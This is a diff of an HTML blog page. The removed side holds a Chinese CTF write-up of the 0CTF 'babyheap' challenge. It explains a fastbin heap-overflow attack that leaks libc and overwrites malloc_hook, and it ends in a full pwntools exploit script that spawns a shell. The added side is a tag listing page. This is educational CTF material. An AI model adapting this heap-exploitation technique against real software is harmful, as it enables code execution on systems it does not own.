@@ -5,6 +5,8 @@
   <!-- SEO相关 -->
   
     
+      <meta name="robots" content="noindex,follow">
+    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -22,11 +24,9 @@
 
   <!-- 页面元数据 -->
   
-  <title>Fastbin attack (Babyheap) - Bin Fantasy🤯</title>
+  <title>Tag: WriteUp - Bin Fantasy🤯</title>
   
 
-  
-    <meta name="description" content="​        新手肝babyheap要掉多少头发😑（malloc_hook的偏移我居然看了那么久。。）">
   
 
   <!-- feed -->
@@ -311,7 +311,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="l_cover">
   
     
-        <div id="full" class='cover-wrapper post search' style="display: none;">
+        <div id="full" class='cover-wrapper  search' style="display: none;">
           
             <div id='cover-backstretch'></div>
           
@@ -321,6 +321,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
       <p class="title">Bin Fantasy🤯</p>
     
+    
+      <p class="subtitle">A ScriptKid doing Pwn and AndroidRe</p>
     
   </div>
   <div class='bottom'>
@@ -334,15 +336,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     <div class='menu navigation'>
       <div class='list-h'>
-        
-          
-            <a href="/"
-              
-              
-              id="home">
-              <p>A ScriptKid doing Pwn and AndroidRe</p>
-            </a>
-          
         
       </div>
     </div>
@@ -359,231 +352,126 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper" id="pjax-container">
           
 
+
 <div class='l_main'>
-  <article class="article post white-box reveal md shadow article-type-post" id="post" itemscope itemprop="blogPost">
   
-
-
+    
+      
+  <section class="post-list">
+    
+      
+        
+          
+        
+          
+        
+      
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
+  
+  
   
     <div class='headimg-div'>
-      <a class='headimg-a'>
-        <img class='headimg' src='https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/wallpaper/5.jpg'/>
+      <a class='headimg-a' href="/2020/07/25/pwnable/">
+        <img class='headimg' src='https://z3.ax1x.com/2021/03/23/6HQ8Ld.gif'/>
       </a>
     </div>
   
-  <div class="article-meta" id="top">
+  
     
+    <h2 class="article-title" >
+      <a href="/2020/07/25/pwnable/">
+        Pwnable.tw (start & calc)
+      </a>
+    </h2>
+  
+  <div class='md'>
     
-    
-      <h1 class="title">
-        Fastbin attack (Babyheap)
-      </h1>
-      <div class='new-meta-box'>
-        
-          
-            
-<div class='new-meta-item author'>
-  <a class='author' href="/" rel="nofollow">
-    <img no-lazy src="https://z3.ax1x.com/2021/03/23/67vIqs.jpg">
-    <p>Ash3n-On3</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-
-          
-        
-          
-            <div class="new-meta-item date">
-  <a class='notlink'>
-    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>Posted in:Feb 29, 2020</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class="new-meta-item browse leancloud">
-    <a class='notlink'>
-      
-      <div id="lc-pv" data-title="Fastbin attack (Babyheap)" data-path="/2020/02/29/Fastbin%20attack%20-%20Babyheap/">
-        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
-        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
-         views
-      </div>
-    </a>
-  </div>
-
-
-          
-        
-      </div>
+      <p>​        最近边看书边刷pwnable.tw，记录一下write up。
     
   </div>
-
-
   
-  
-  <p>​        新手肝babyheap要掉多少头发😑（malloc_hook的偏移我居然看了那么久。。）<span id="more"></span></p>
-<h2 id="1-关于Fast-bin"><a href="#1-关于Fast-bin" class="headerlink" title="1.关于Fast_bin"></a>1.关于Fast_bin</h2><p>​        fast bin和其他的bin一样，都是一种用来记录free chunk的<strong>链表数据结构</strong>有单链表有双链表，因种类不同功能不同而采用不同的结构。fast bin专门使用于存放比较小的chunk，具体为16 bytes – 80 bytes（此处指malloc的实际大小）fast bin的设计初衷就是进行快速的<strong>小内存</strong>分配和释放，因此fast chunk之间是不进行合并的，即不存在unlink。因此其 next_chunk 的 prev_inuse 位也不会被清空。，也就催生了fast bin的漏洞。</p>
-<h2 id="2-babyheap复现"><a href="#2-babyheap复现" class="headerlink" title="2.babyheap复现"></a>2.babyheap复现</h2><h3 id="A-题目分析"><a href="#A-题目分析" class="headerlink" title="A.题目分析"></a>A.题目分析</h3><ul>
-<li><p>Link – <a target="_blank" rel="noopener" href="https://uaf.io/assets/0ctfbabyheap">https://uaf.io/assets/0ctfbabyheap</a></p>
-<p>常规操作：丢ubuntu分析：保护全开，一般都是堆题。。</p>
-<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/4.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="4" style="zoom: 57%;" /></div>
-丢ida_64分析：
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="built_in">sub_B70</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">menu</span>();</span><br><span class="line">    <span class="built_in">Read</span>();</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> ( off_14F4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1uLL</span>:</span><br><span class="line">        <span class="built_in">Add</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2uLL</span>:</span><br><span class="line">        <span class="built_in">Fill</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3uLL</span>:</span><br><span class="line">        <span class="built_in">Free</span>(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4uLL</span>:</span><br><span class="line">        <span class="built_in">Dump</span>(v4);                             </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5uLL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>Add()：新建chunk,由用户输入size,用calloc分配内存,先行初始化chunk。</p>
-</li>
-<li><p>Fill()：写入chunk,由用户决定size，与Add()size不同,所以存在堆溢出。</p>
-</li>
-<li><p>Free()：删除chunk,而且指针置空,不存在UAF漏洞。</p>
-</li>
-<li><p>Dump()：输出chunk,没啥特别。</p>
-<p>另外还有一点就是，文件存在alarm()函数，因此在调试时有时间限制。</p>
-<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/1.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom: 80%;" />
-
-<p>不过只要在伪代码中，将汇编指令修改一下，将call alarm改成nop就行。</p>
-<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/2.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />
-
-<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/3.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:80%;" />
-
-<p>所以说我们可以利用的只有堆溢出这一个漏洞。</p>
-<h3 id="B-Leak-Libc-base"><a href="#B-Leak-Libc-base" class="headerlink" title="B.Leak  Libc_base"></a>B.Leak  Libc_base</h3><p>对于这个题目可以进行fastbin_attack,先新建5个chunk，大小功能如下。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite</span></span><br><span class="line">  Add(<span class="number">0x20</span>)			</span><br><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used to point the same aera of chunk4</span></span><br><span class="line">  Add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite</span></span><br><span class="line">Add(<span class="number">0x80</span>)		<span class="comment">#used to leak the libc_base</span></span><br></pre></td></tr></table></figure>
-
-<p>各个堆块结构如下：</p>
-<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" class="lazyload" data-srcset="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/Fastbin_attack-babyheap/5.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" style="zoom:20%;" /></div>
-​    根据堆结构，填充空余部分时要这样写脚本：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  payload = p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)</span><br><span class="line">payload+= p64(<span class="number">0</span>) * <span class="number">5</span> + p64(<span class="number">31</span>)  + p8(<span class="number">0xC0</span>)</span><br></pre></td></tr></table></figure>
-
-<p>​        p8(0xC0)也就刚好覆盖到了chunk2的FD指针。接着就是一系列内存布局，目的是让leak出small chunk2的FD指针，因为当程序中只有一个small/unsort chunk在链表上时，其FD和BK都指向距离main_arena 0x58的地址。也就是说：</p>
-<ol>
-<li><p>Leak_addr - 0x58 = main_arena</p>
-</li>
-<li><p>main_arena - 0x3c4b20 = libc_base</p>
-<p>内存布局如下(非实际脚本，仅用于理解)：</p>
-</li>
-</ol>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  free(chunk1)	main_arena--&gt;chunk1</span><br><span class="line">  free(chunk2)	main_arena--&gt;chunk2--&gt;chunk1</span><br><span class="line">  fill(chunk0)	main_arena--&gt;chunk2--&gt;chunk4 #overwrite</span><br><span class="line">  fill(chunk3)	<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line">  <span class="comment">#so we can malloc chunk4 as fastbin</span></span><br><span class="line">  add(0x20)		main_arena--&gt;chunk4&lt;--chunk2</span><br><span class="line">  add(<span class="number">0x20</span>)		main_arena   chunk4&lt;--chunk2 <span class="comment">#share the same addr</span></span><br><span class="line">  fill(chunk3)	<span class="comment">#modify the size of chunk4 (0x91 --&gt; 0x31)</span></span><br><span class="line"><span class="comment">#so we can pass the check and free chunk4 as smallbin</span></span><br><span class="line">  add(<span class="number">0x80</span>)		<span class="comment">#chunk 5 , for avoiding the merging into top_chunk</span></span><br><span class="line">free(chunk4)	main_arena-<span class="number">0x58</span>&lt;--chunk4&lt;--chunk2</span><br><span class="line">  dump(chunk2)	<span class="comment">#Leak libc_base</span></span><br></pre></td></tr></table></figure>
-
-<p>​        经过布局之后可以使得chunk2和chunk4指向相同。</p>
-<h3 id="C-Getshell"><a href="#C-Getshell" class="headerlink" title="C. Getshell"></a>C. Getshell</h3><p>​        那么现在有了libc_base要怎么利用咧。可以通过<strong>one_gadget</strong>搜libc里的excute(“/bin/sh”)，搜出来的不止一个，需要一个个尝试，再找机会调用运行。今天新学到的一个小姿势：main_arena上方有一个函数指针叫<strong>malloc_hook</strong>，正常情况下为空，但如果系统在调用malloc， realloc，free时监测到malloc_hook非空就会立即执行malloc_hook中的汇编指令。针对malloc_hook的攻击会另外再写一篇小记。</p>
-<p>​        所以说利用思路就是：可以利用堆，修改堆的FD指针指向malloc_hook的一定偏移处，使得fill(chunk)时可以恰好覆盖到malloc_hook并执行。</p>
-<ol>
-<li>将chunk4申请出来并将其大小压缩在fastchunk的范围。</li>
-<li>释放chunk4，此时用chunk2覆写chunk4的FD指针，使其指向距离malloc_hook的一定偏移处。(准确地址为libc_base+0x3C4AED，在此处恰好可以分配到合适的fastbin，这里的偏移计算涉及malloc_hook攻击。)</li>
-<li>申请两个chunk(fastchunk)，第一次会分配到chunk4，第二次会分配到新的chunk6，chunk6的地址正是目标地址。</li>
-<li>将shellcode写入到chunk6。</li>
-<li>执行一次add()即可getshell。</li>
-</ol>
-<h3 id="D-Exploit"><a href="#D-Exploit" class="headerlink" title="D.Exploit"></a>D.Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line">env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so.6&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size:  &quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Command: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	<span class="keyword">return</span> p.recvline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite									0x..............00</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#												   0x..............30</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used to point the same aera of chunk4				  0x..............60</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#used for overwrite									0x..............90</span></span><br><span class="line">add(<span class="number">0x80</span>)		<span class="comment">#used to leak the libc_base							 0x..............C0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">payload+=p64(<span class="number">0xC0</span>)</span><br><span class="line">fill(<span class="number">0</span>,payload)	<span class="comment">#now the chunk2 is pointing at the chunk4, they share the same addr</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#In order to draw the chunk4 into fastbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x31</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)	<span class="comment">#now the size of chunk4 is 0x30,we can easily malloc it as a fastchunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#chunk2</span></span><br><span class="line">add(<span class="number">0x20</span>)		<span class="comment">#chunk4</span></span><br><span class="line"><span class="comment">#In order to put the chunk4 into smallbin ,its size need to be modified</span></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)	 <span class="comment">#now the size of chunk4 is 0x90,we can easily free it as a smallchunk</span></span><br><span class="line">add(<span class="number">0x80</span>)			<span class="comment">#avoid merging into top_chunk :chunk5</span></span><br><span class="line">free(<span class="number">4</span>)			<span class="comment">#here we&#x27;ve got the fd ptr of chunk4,which is pointing at main_arena-0x58 while it was freed</span></span><br><span class="line">fd_ptr = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">main_arena = fd_ptr - <span class="number">0x58</span></span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span>	<span class="comment">#0x3c4b20 is the offset of main_arena in libc</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)		<span class="comment">#transform the chunk4 into fastchunk again,so we are able to fastbin attack</span></span><br><span class="line">free(<span class="number">4</span>)				</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload+=p64(main_arena - <span class="number">0x33</span>)	</span><br><span class="line"><span class="comment">#the same as : malloc_hook-0x23 || libc_base+0x3C4B20-0x33 || libc_base - 0x3C4AED</span></span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)			<span class="comment">#chunk 4</span></span><br><span class="line">add(<span class="number">0x60</span>)			<span class="comment">#chunk 6</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">3</span>	<span class="comment">#length of &quot;AAA&quot;+p64(0)*2 = 0x23,it&#x27;s the very length to fill the malloc_hook</span></span><br><span class="line">payload+=p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload+=p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)			<span class="comment">#add() to call excute(&quot;/bin/sh&quot;)  &quot;1&quot;has not meaning</span></span><br><span class="line">p.interactive()	</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-
-  
-  
-    
-    <div class='footer'>
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time>2020-07-25</time>
+        
+      </div>
       
-      
-      
-        <div class='copyright'>
-          <blockquote>
-            
-              
-                <p>Copy rights reserved.Permanent Link 👇</p>
-
-              
-            
-              
-                <p> <a href=http://example.com/2020/02/29/Fastbin%20attack%20-%20Babyheap/>http://example.com/2020/02/29/Fastbin%20attack%20-%20Babyheap/</a></p>
-              
-            
-          </blockquote>
+        <div>
+          <a class='readmore' href='/2020/07/25/pwnable/'>
+            Read More
+          </a>
         </div>
       
+    </div>
+  
+
+</div>
+
+          </div>
+        
       
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow">
+  
+  
+  
+    <div class='headimg-div'>
+      <a class='headimg-a' href="/2020/04/13/guess/">
+        <img class='headimg' src='https://z3.ax1x.com/2021/03/23/6HQrLj.gif'/>
+      </a>
     </div>
   
   
     
-
-
-  <div class='article-meta' id="bottom">
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-03-23T16:37:24+08:00">
-  <a class='notlink'>
-    <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>Update in:Mar 23, 2021</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-
-        
-      
-        
-      
-    </div>
+    <h2 class="article-title" >
+      <a href="/2020/04/13/guess/">
+        2018网鼎pwn (guess复现)
+      </a>
+    </h2>
+  
+  <div class='md'>
+    
+      <p>​        2018网鼎pwn题复现与学习。
+    
   </div>
-
-
   
-  
-
-  
-    <div class="prev-next">
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time>2020-04-13</time>
+        
+      </div>
       
-        <a class='prev' href='/2020/03/01/Malloc-Hook/'>
-          <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>Malloc_Hook小记</p>
-          <p class='content'>​        malloc_hook的介绍以及用堆进行malloc_hook攻击。
-​        昨天的babyheap算是碰上的第一个malloc_hook利用，而且看这么简单的偏移都...</p>
-        </a>
-      
-      
-        <a class='next' href='/2020/02/28/UAF-Hacknote/'>
-          <p class='title'>UAF (Hacknote)<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>​        从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。
-​        课设做很久了，摸鱼划水也很久了，抓紧时间系统地肝一下堆题吧。再不好好学要废了。。
-1.关于UAF​ ...</p>
-        </a>
+        <div>
+          <a class='readmore' href='/2020/04/13/guess/'>
+            Read More
+          </a>
+        </div>
       
     </div>
   
-</article>
 
-
-  
-
-  <article class="post white-box reveal shadow" id="comments">
-    <p ct><i class='fas fa-comments'></i> 评论</p>
-    
-    <div id="valine_container" class="valine_thread">
-  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-  </article>
+          </div>
+        
+      
+    
+  </section>
+  
+    
+  
 
 
-
-
-
-
+    
+  
 </div>
 <aside class='l_side'>
   
@@ -591,28 +479,103 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
 
+<section class="widget blogger shadow desktop mobile">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img no-lazy src='https://z3.ax1x.com/2021/03/23/67vIqs.jpg'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+        
+        
+          <p><span id="jinrishici-sentence">Bin Fantasy🤯</span></p>
+          <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/"
+              class="social fas fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/415276022@qq.com"
+              class="social fas fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/ash3n-on3"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/"
+              class="social fas fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
 
+  
 
-  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+  
+    
+    
+
+  
+
+  
+    
+    
+  
+
+  <section class="widget tagcloud shadow desktop mobile">
     
   <header>
     
-      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>Catalog</span>
+      <a href='/blog/tags/'><i class="fas fa-tags fa-fw" aria-hidden="true"></i><span class='name'>热门标签</span></a>
     
   </header>
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%B3%E4%BA%8EFast-bin"><span class="toc-text">1.关于Fast_bin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-babyheap%E5%A4%8D%E7%8E%B0"><span class="toc-text">2.babyheap复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#A-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">A.题目分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#B-Leak-Libc-base"><span class="toc-text">B.Leak  Libc_base</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#C-Getshell"><span class="toc-text">C. Getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#D-Exploit"><span class="toc-text">D.Exploit</span></a></li></ol></li></ol>
+      <a href="/tags/StackOverflow/" style="font-size: 14px; color: #999">StackOverflow</a> <a href="/tags/Summary/" style="font-size: 14px; color: #999">Summary</a> <a href="/tags/WriteUp/" style="font-size: 19px; color: #777">WriteUp</a> <a href="/tags/heap/" style="font-size: 24px; color: #555">heap</a>
     </div>
   </section>
 
 
   
 
+  
+
 
 </aside>
-
 
 
 		  
